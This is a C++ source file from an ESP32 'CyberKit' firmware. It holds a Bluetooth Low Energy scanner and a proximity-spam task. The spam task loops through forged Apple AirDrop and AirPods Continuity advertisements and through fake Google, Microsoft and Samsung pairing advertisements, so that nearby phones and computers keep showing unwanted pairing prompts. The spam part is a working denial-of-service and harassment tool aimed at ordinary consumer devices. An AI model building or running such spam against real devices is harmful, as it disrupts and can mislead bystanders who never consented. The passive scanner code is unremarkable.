/**
 * @file ble_manager.cpp
 * @brief Gestor BLE — Scanner + Spam de proximidad (Apple/Android/Windows/Samsung).
 *
 * @author Pedro Luis Rezabala Delgado — ChL-CyberKit v1.0 PRO
 * @copyright Copyright (C) 2026 Pedro Luis Rezabala Delgado. GPL v3.
 */
#include "ble_manager.h"
#include <string.h>
#include <Arduino.h>
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

/* BLE stack */
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BLEAdvertising.h>

static const char *TAG = "ble_mgr";

/* ── Estado interno ─────────────────────────────────────────────────────── */
static volatile ble_state_t  s_state       = BLE_IDLE;
static ble_device_t          s_devices[BLE_SCAN_MAX_DEVICES];
static uint8_t               s_dev_count   = 0;
static SemaphoreHandle_t     s_mutex       = NULL;
static TaskHandle_t          s_spam_task   = NULL;
static volatile uint32_t     s_spam_count  = 0;
static volatile ble_spam_type_t s_spam_type = BLE_SPAM_ALL;
static BLEScan              *s_ble_scan    = NULL;
static bool                  s_ble_inited  = false;

/* ── Payloads de spam ─────────────────────────────────────────────────────
 * Apple Continuity — tipo 0x10 (AirDrop), 0x07 (AirPods)
 * Android Fast Pair — Company 0x00E0 (Google)
 * Windows Swift Pair — Company 0x0006 (Microsoft)
 * Samsung Fast Pair  — Company 0x0075 (Samsung)
 ─────────────────────────────────────────────────────────────────────────── */

/* Apple AirDrop */
static const uint8_t APPLE_AIRDROP[] = {
    0x08, 0xFF,
    0x4C, 0x00,        /* Apple Company ID */
    0x10, 0x09,        /* Continuity type=AirDrop, len=9 */
    0x00, 0x00, 0x00,  /* padding */
    0x00, 0x00,        /* sender hash */
    0x00, 0x00, 0x00,  /* receiver hash */
    0x00
};

/* Apple AirPods */
static const uint8_t APPLE_AIRPODS[] = {
    0x1E, 0xFF,
    0x4C, 0x00,
    0x07, 0x19,        /* AirPods proximity */
    0x01,              /* model: AirPods Pro */
    0x02, 0x20, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00
};

/* Android Fast Pair (Google) */
static const uint8_t ANDROID_PAIR[] = {
    0x06, 0xFF,
    0xE0, 0x00,        /* Google Company ID */
    0x00, 0x12, 0x34   /* placeholder model ID */
};

/* Windows Swift Pair (Microsoft) */
static const uint8_t WINDOWS_SWIFT[] = {
    0x06, 0xFF,
    0x06, 0x00,        /* Microsoft Company ID */
    0x03,              /* type: Swift Pair */
    0x00, 0x80
};

/* Samsung Fast Pair */
static const uint8_t SAMSUNG_PAIR[] = {
    0x07, 0xFF,
    0x75, 0x00,        /* Samsung Company ID */
    0x42, 0x09,        /* device model */
    0x81, 0x02
};

/* ── Callback de escaneo BLE ─────────────────────────────────────────────── */
class ScanCallback : public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice dev) override {
        if (s_state != BLE_SCANNING) return;
        if (!s_mutex) return;

        uint8_t addr[6];
        std::string addrStr = dev.getAddress().toString();
        /* Parsear MAC */
        sscanf(addrStr.c_str(),
               "%02hhX:%02hhX:%02hhX:%02hhX:%02hhX:%02hhX",
               &addr[5],&addr[4],&addr[3],&addr[2],&addr[1],&addr[0]);

        if (xSemaphoreTake(s_mutex, pdMS_TO_TICKS(10)) != pdTRUE) return;

        /* ¿Ya existe? */
        for (uint8_t i = 0; i < s_dev_count; i++) {
            if (memcmp(s_devices[i].addr, addr, 6) == 0) {
                s_devices[i].rssi      = (int8_t)dev.getRSSI();
                s_devices[i].last_seen = (uint32_t)millis();
                xSemaphoreGive(s_mutex);
                return;
            }
        }

        /* Nuevo dispositivo */
        if (s_dev_count >= BLE_SCAN_MAX_DEVICES) {
            xSemaphoreGive(s_mutex);
            return;
        }

        ble_device_t *d = &s_devices[s_dev_count];
        memset(d, 0, sizeof(ble_device_t));
        memcpy(d->addr, addr, 6);
        d->rssi      = (int8_t)dev.getRSSI();
        d->addr_type = (uint8_t)dev.getAddressType();
        d->last_seen = (uint32_t)millis();

        if (dev.haveName()) {
            strncpy(d->name, dev.getName().c_str(), sizeof(d->name)-1);
        }

        /* Clasificar por manufacturer data */
        if (dev.haveManufacturerData()) {
            std::string mfr = dev.getManufacturerData();
            if (mfr.size() >= 2) {
                uint16_t cid = (uint8_t)mfr[0] | ((uint8_t)mfr[1] << 8);
                if (cid == 0x004C) strncpy(d->type_str, "Apple",   15);
                else if (cid == 0x00E0) strncpy(d->type_str, "Android", 15);
                else if (cid == 0x0006) strncpy(d->type_str, "Windows", 15);
                else if (cid == 0x0075) strncpy(d->type_str, "Samsung", 15);
                else                   strncpy(d->type_str, "Generic", 15);
            }
        } else {
            strncpy(d->type_str, "Generic", 15);
        }

        s_dev_count++;
        ESP_LOGD(TAG, "BLE[%u] %s %s rssi=%d",
                 s_dev_count-1, addrStr.c_str(), d->type_str, d->rssi);

        xSemaphoreGive(s_mutex);
    }
};

static ScanCallback s_scan_cb;

/* ── Tarea de spam ───────────────────────────────────────────────────────── */
static void spam_task(void *arg) {
    (void)arg;
    BLEAdvertising *adv = BLEDevice::getAdvertising();
    uint8_t rot = 0;

    while (s_state == BLE_SPAMMING) {
        BLEAdvertisementData data;
        ble_spam_type_t cur = s_spam_type;
        if (cur == BLE_SPAM_ALL) cur = (ble_spam_type_t)(rot % 5);

        switch (cur) {
            case BLE_SPAM_APPLE_AIRDROP:
                data.addData(std::string((char*)APPLE_AIRDROP, sizeof(APPLE_AIRDROP)));
                break;
            case BLE_SPAM_APPLE_AIRPODS:
                data.addData(std::string((char*)APPLE_AIRPODS, sizeof(APPLE_AIRPODS)));
                break;
            case BLE_SPAM_ANDROID_PAIR:
                data.addData(std::string((char*)ANDROID_PAIR, sizeof(ANDROID_PAIR)));
                break;
            case BLE_SPAM_WINDOWS_SWIFT:
                data.addData(std::string((char*)WINDOWS_SWIFT, sizeof(WINDOWS_SWIFT)));
                break;
            case BLE_SPAM_SAMSUNG_PAIR:
            default:
                data.addData(std::string((char*)SAMSUNG_PAIR, sizeof(SAMSUNG_PAIR)));
                break;
        }

        adv->setAdvertisementData(data);
        adv->start();
        vTaskDelay(pdMS_TO_TICKS(BLE_SPAM_INTERVAL_MS));
        adv->stop();

        s_spam_count++;
        rot++;
    }

    s_spam_task = NULL;
    vTaskDelete(NULL);
}

/* ── API pública ─────────────────────────────────────────────────────────── */

extern "C" bool ble_manager_init(void) {
    if (s_ble_inited) return true;
    s_mutex = xSemaphoreCreateMutex();
    if (!s_mutex) return false;

    BLEDevice::init("CyberKit");
    s_ble_scan = BLEDevice::getScan();
    s_ble_scan->setAdvertisedDeviceCallbacks(&s_scan_cb);
    s_ble_scan->setActiveScan(false);
    s_ble_scan->setInterval(100);
    s_ble_scan->setWindow(99);

    s_ble_inited = true;
    s_state      = BLE_IDLE;
    s_dev_count  = 0;
    s_spam_count = 0;
    ESP_LOGI(TAG, "BLE inicializado");
    return true;
}

extern "C" bool ble_scan_start(void) {
    if (s_state != BLE_IDLE) return false;
    if (!s_ble_inited && !ble_manager_init()) return false;
    s_state = BLE_SCANNING;
    s_ble_scan->start(0, nullptr, false); /* 0 = continuo */
    ESP_LOGI(TAG, "Escaneo BLE iniciado");
    return true;
}

extern "C" void ble_scan_stop(void) {
    if (s_state == BLE_SCANNING) {
        s_ble_scan->stop();
        s_state = BLE_IDLE;
        ESP_LOGI(TAG, "Escaneo BLE detenido (%u dispositivos)", s_dev_count);
    }
}

extern "C" uint8_t ble_scan_device_count(void) { return s_dev_count; }

extern "C" const ble_device_t *ble_scan_get_device(uint8_t idx) {
    if (idx >= s_dev_count) return NULL;
    return &s_devices[idx];
}

extern "C" void ble_scan_clear(void) {
    if (s_mutex) xSemaphoreTake(s_mutex, portMAX_DELAY);
    s_dev_count = 0;
    memset(s_devices, 0, sizeof(s_devices));
    if (s_mutex) xSemaphoreGive(s_mutex);
}

extern "C" bool ble_spam_start(ble_spam_type_t type) {
    if (s_state != BLE_IDLE) return false;
    if (!s_ble_inited && !ble_manager_init()) return false;
    s_spam_type  = type;
    s_spam_count = 0;
    s_state      = BLE_SPAMMING;
    BaseType_t r = xTaskCreate(spam_task, "ble_spam", 4096, NULL,
                                tskIDLE_PRIORITY + 2, &s_spam_task);
    if (r != pdPASS) { s_state = BLE_IDLE; return false; }
    ESP_LOGI(TAG, "BLE spam iniciado tipo=%u", (unsigned)type);
    return true;
}

extern "C" void ble_spam_stop(void) {
    if (s_state == BLE_SPAMMING) {
        s_state = BLE_IDLE;
        vTaskDelay(pdMS_TO_TICKS(BLE_SPAM_INTERVAL_MS + 50));
        BLEDevice::getAdvertising()->stop();
        ESP_LOGI(TAG, "BLE spam detenido — %lu anuncios", (unsigned long)s_spam_count);
    }
}

extern "C" uint32_t     ble_spam_count(void)  { return s_spam_count; }
extern "C" ble_state_t  ble_get_state(void)   { return s_state; }
